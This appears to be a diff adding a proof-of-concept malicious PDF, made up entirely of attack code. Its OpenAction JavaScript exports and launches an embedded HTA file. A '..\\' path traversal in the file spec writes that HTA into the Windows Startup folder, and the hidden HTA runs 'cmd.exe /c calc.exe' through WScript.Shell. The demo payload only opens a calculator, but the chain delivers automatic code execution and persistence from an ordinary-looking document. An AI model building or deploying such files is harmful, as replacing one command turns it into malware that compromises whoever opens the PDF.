@@ -1,0 +1,54 @@
+%PDF 
+1 0 obj
+<</Pages 1 0 R
+/Names
+<</EmbeddedFiles 
+<</Names [(exploit.hta) 4 0 R] >> >>  /OpenAction 2 0 R>>
+endobj
+
+2 0 obj
+<</S/JavaScript/JS(
+	function main() {
+		this.exportDataObject({cName:"exploit.hta", nLaunch:2});
+	}
+	main();
+)/Type/Action>>
+endobj
+
+3 0 obj
+<<
+	/Length 6
+	/Params
+	<</ModDate(D:20230731134730-08'00')
+	/Size 6
+	/CheckSum<FA0903293EC8FC1F19087D0EB2FFDED8>
+	/CreationDate(D:20230731133537-08'00')
+>>Subtype/application#2Fhta/Type/EmbeddedFile>>
+stream
+<html>
+<head>
+<hta:application id="oHTA"
+applicationname="myApp"
+windowstate="normal"
+maximizebutton="no"
+minimizebutton="no"
+caption="no"
+showintaskbar="no">
+<script language='javascript'>
+window.resizeTo(0,0);
+var cmd = 'cmd.exe /c calc.exe';
+new ActiveXObject('WScript.Shell').Run(cmd);
+</script>
+</head>
+<body scroll="no">
+</body>
+</html>
+endstream
+endobj
+	
+4 0 obj
+<<
+/UF(..\\..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\exploit.hta)/EF
+<< /F 3 0 R >>/Type/Filespec/F() >>
+endobj
+)>> trailer <</Root 1 0 R>>
